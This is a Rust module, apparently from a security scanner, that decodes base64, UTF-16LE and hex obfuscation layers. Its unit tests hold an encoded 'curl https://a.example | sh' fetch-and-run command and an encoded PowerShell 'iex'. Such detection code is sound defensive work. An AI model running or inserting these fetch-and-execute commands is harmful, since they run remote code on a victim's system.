//! Small, allocation-bounded decoders for the obfuscation layers attackers
//! use most: base64 (standard and URL-safe), UTF-16LE (PowerShell
//! `-EncodedCommand`) and hex.

/// Upper bound on any single decoded payload.
pub const MAX_DECODED: usize = 16 * 1024;

fn b64_val(c: u8) -> Option<u32> {
    Some(match c {
        b'A'..=b'Z' => (c - b'A') as u32,
        b'a'..=b'z' => (c - b'a' + 26) as u32,
        b'0'..=b'9' => (c - b'0' + 52) as u32,
        b'+' | b'-' => 62,
        b'/' | b'_' => 63,
        _ => return None,
    })
}

/// True if `s` plausibly is a base64 blob worth decoding.
pub fn looks_base64(s: &str) -> bool {
    let t = s.trim();
    if t.len() < 16 {
        return false;
    }
    let body = t.trim_end_matches('=');
    if t.len() - body.len() > 2 {
        return false;
    }
    let mut lower = false;
    let mut upper = false;
    let mut digit_or_sym = false;
    for &b in body.as_bytes() {
        match b {
            b'a'..=b'z' => lower = true,
            b'A'..=b'Z' => upper = true,
            b'0'..=b'9' | b'+' | b'/' | b'-' | b'_' => digit_or_sym = true,
            _ => return false,
        }
    }
    // Real base64 of text mixes cases; plain words or paths rarely do all three.
    lower && upper && (digit_or_sym || body.len() >= 24)
}

/// Decode base64, ignoring whitespace. Returns `None` on invalid input.
pub fn base64(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity((s.len() * 3 / 4).min(MAX_DECODED));
    let mut acc = 0u32;
    let mut bits = 0u32;
    for &c in s.as_bytes() {
        if c == b'=' {
            break;
        }
        if c.is_ascii_whitespace() {
            continue;
        }
        acc = (acc << 6) | b64_val(c)?;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
            if out.len() >= MAX_DECODED {
                break;
            }
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Decode UTF-16LE bytes (PowerShell `-EncodedCommand`).
pub fn utf16le(bytes: &[u8]) -> String {
    let units = bytes
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]));
    char::decode_utf16(units)
        .map(|r| r.unwrap_or('\u{FFFD}'))
        .collect()
}

/// Decode a base64 payload to text, trying UTF-8 then UTF-16LE. Only
/// returns mostly-printable text.
pub fn base64_text(s: &str) -> Option<String> {
    let bytes = base64(s)?;
    let as_text = |t: String| -> Option<String> { printable_ratio(&t).ge(&0.85).then_some(t) };
    if bytes.len() >= 4 && bytes[1] == 0 && bytes[3] == 0 {
        if let Some(t) = as_text(utf16le(&bytes)) {
            return Some(t);
        }
    }
    match String::from_utf8(bytes) {
        Ok(t) => as_text(t),
        Err(e) => as_text(String::from_utf8_lossy(e.as_bytes()).into_owned()),
    }
}

/// Decode a hex string such as `6375726c` to text.
pub fn hex_text(s: &str) -> Option<String> {
    let t = s.trim();
    if t.len() < 16 || t.len() % 2 != 0 || !t.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    let bytes: Vec<u8> = (0..t.len().min(MAX_DECODED * 2))
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&t[i..i + 2], 16).ok())
        .collect();
    let text = String::from_utf8(bytes).ok()?;
    (printable_ratio(&text) >= 0.9).then_some(text)
}

fn printable_ratio(t: &str) -> f32 {
    let total = t.chars().count();
    if total == 0 {
        return 0.0;
    }
    let ok = t
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'))
        .filter(|c| *c != '\u{FFFD}')
        .count();
    ok as f32 / total as f32
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decodes_base64_and_utf16() {
        assert_eq!(
            base64_text("Y3VybCBodHRwczovL2EuZXhhbXBsZSB8IHNo").unwrap(),
            "curl https://a.example | sh"
        );
        // "iex" in UTF-16LE
        assert_eq!(base64_text("aQBlAHgA").as_deref(), Some("iex"));
        assert_eq!(utf16le(&base64("aQBlAHgA").unwrap()), "iex");
    }

    #[test]
    fn rejects_non_base64() {
        assert!(!looks_base64("hello"));
        assert!(!looks_base64("/usr/local/bin/something"));
        assert!(looks_base64("Y3VybCBodHRwczovL2EuZXhhbXBsZSB8IHNo"));
        assert!(base64("!!!").is_none());
    }

    #[test]
    fn decodes_hex() {
        assert_eq!(hex_text("6375726c2068747470").unwrap(), "curl http");
        assert!(hex_text("zz").is_none());
    }
}
